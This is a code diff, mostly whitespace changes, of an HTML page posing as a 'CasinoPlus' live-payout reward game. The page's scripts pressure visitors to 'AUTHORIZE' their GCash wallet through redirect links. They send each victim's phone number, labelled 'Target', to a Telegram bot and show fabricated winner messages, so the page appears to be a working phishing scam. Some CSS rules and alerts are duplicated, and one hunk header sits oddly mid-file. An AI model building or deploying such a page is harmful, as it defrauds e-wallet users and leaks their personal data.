@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>CasinoPlus | Live Payout</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CasinoPlus | Live Payout</title>
 
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-<script src="js/config.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="js/config.js"></script>
 
-<script>
-(function() {
+    <script>
+        (function() {
             // Check for Banned or Not Verified
-const isBanned = localStorage.getItem("cp_device_locked") === "true";
-const isVerified = localStorage.getItem("cp_verified") === "true";
-if (isBanned || !isVerified) {
-window.location.replace("index.html"); 
-return;
-}
+            const isBanned = localStorage.getItem("cp_device_locked") === "true";
+            const isVerified = localStorage.getItem("cp_verified") === "true";
+            if (isBanned || !isVerified) {
+                window.location.replace("index.html"); 
+                return;
+            }
 
             // Mobile-Only Enforcement
             const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
@@ -29,22 +29,22 @@ return;
                     document.getElementById('mainContent').style.display = 'none';
                 }
             };
-})();
-</script>
+        })();
+    </script>
 
 @@ -25,114 +37,181 @@
-<style>
-:root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); --dark-bg: #04070d; }
-* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    <style>
+        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); --dark-bg: #04070d; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { font-family: 'Public Sans', sans-serif; background-color: var(--dark-bg); background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
         body { font-family: 'Public Sans', sans-serif; background-color: var(--dark-bg); background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; overflow-x: hidden; }
 
         /* OVERLAYS */
-#processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; backdrop-filter: blur(15px); }
+        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; backdrop-filter: blur(15px); }
         #mobileOnlyOverlay { position: fixed; inset: 0; background: #060a13; z-index: 999998; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 30px; }
         
-.spinner { width: 60px; height: 60px; border: 5px solid rgba(212, 175, 55, 0.3); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
-@keyframes spin { to { transform: rotate(360deg); } }
+        .spinner { width: 60px; height: 60px; border: 5px solid rgba(212, 175, 55, 0.3); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
         /* GRID SYSTEM */
         .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; margin: 20px 0; }
@@ -77,22 +77,22 @@ return;
         .btn-group { display: flex; flex-direction: column; gap: 12px; margin-top: 10px; }
         .pay-button { background: var(--gold); color: #000; width: 100%; padding: 18px; border: none; border-radius: 15px; font-size: 18px; font-weight: 800; text-transform: uppercase; cursor: pointer; box-shadow: 0 6px 0 #8b6508; transition: 0.2s; }
         .pay-button:active { transform: translateY(3px); box-shadow: 0 3px 0 #8b6508; }
-.pay-button:disabled { background: #334155; color: #64748b; box-shadow: none; cursor: not-allowed; }
+        .pay-button:disabled { background: #334155; color: #64748b; box-shadow: none; cursor: not-allowed; }
         .promo-photo { width: 100%; border-radius: 20px; margin-top: 20px; border: 1px solid rgba(212, 175, 55, 0.2); }
         
         .share-button { background: #1877f2; color: #fff; width: 100%; padding: 12px; border: none; border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .promo-photo { width: 100%; border-radius: 20px; margin-top: 25px; border: 1px solid rgba(212, 175, 55, 0.2); }
-</style>
+    </style>
 </head>
 <body>
 
-<div id="processingOverlay">
-<div class="spinner"></div>
+    <div id="processingOverlay">
+        <div class="spinner"></div>
         <h2 style="color:#fff; margin-bottom:15px;">ESTABLISHING VIALINK...</h2>
         <p style="color:#fbbf24; font-size:14px; padding:0 20px;">Verification required. Tap "AUTHORIZE" to secure your reward via GCash.</p>
         <div class="proc-title">ESTABLISHING SECURE VIALINK...</div>
         <div class="proc-text">⚠️ <b>REQUIRED ACTION:</b><br>Tap <b>"AUTHORIZE"</b> or <b>"AGREE"</b> on the next screen to verify your GCash wallet and receive the reward.</div>
-</div>
+    </div>
 
     <div class="card">
         <img src="images/logo1.png" style="width:150px; margin-bottom:15px;">
@@ -133,12 +133,12 @@ return;
             
             <img src="images/casinoplus.jpeg" class="promo-photo">
         </div>
-</div>
+    </div>
 
-<script>
+    <script>
         // --- 1. INITIALIZE FIREBASE & TRACKING ---
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
         const savedPhone = localStorage.getItem("userPhone") || "Guest";
 
         let balance = 0;
@@ -179,7 +179,7 @@ const db = firebase.database();
         async function trackActivity(action) {
             const message = `🚨 [REWARD ATTEMPT]\n📱 Target: ${savedPhone}\n🔘 Action: ${action}`;
             try { await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`); } catch(e) {}
-}
+        }
 
         function handleCardClick(el) {
             if (clickCount >= maxClicks || el.classList.contains('clicked')) return;
@@ -232,16 +232,16 @@ const db = firebase.database();
                     const url = snap.val()[key].url;
                     db.ref('links/' + key).update({ status: 'pending', user: savedPhone });
                     setTimeout(() => { window.location.href = url; }, 3000);
-} else {
+                } else {
                     alert("System busy! Try again later.");
                     document.getElementById('processingOverlay').style.display = 'none';
                     trackActivity("CRITICAL ERROR: No Ready ViaLinks in Database!");
                     alert("System busy! All reward slots are currently full. Please try again in 10 minutes.");
                     overlay.style.display = 'none';
                     claimBtn.disabled = false;
-}
-});
-}
+                }
+            });
+        }
 
         // --- 3. UI ANIMATIONS & STATS ---
         const possibleAmounts = [350, 500, 750, 1000];
@@ -291,6 +291,6 @@ const db = firebase.database();
             const amt = [500, 800, 1000, 1200][Math.floor(Math.random() * 4)];
             document.getElementById('winnerEntry').innerHTML = `User ${pref}***${suffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱${amt}`;
         }, 4000);
-</script>
+    </script>
 </body>
 </html>
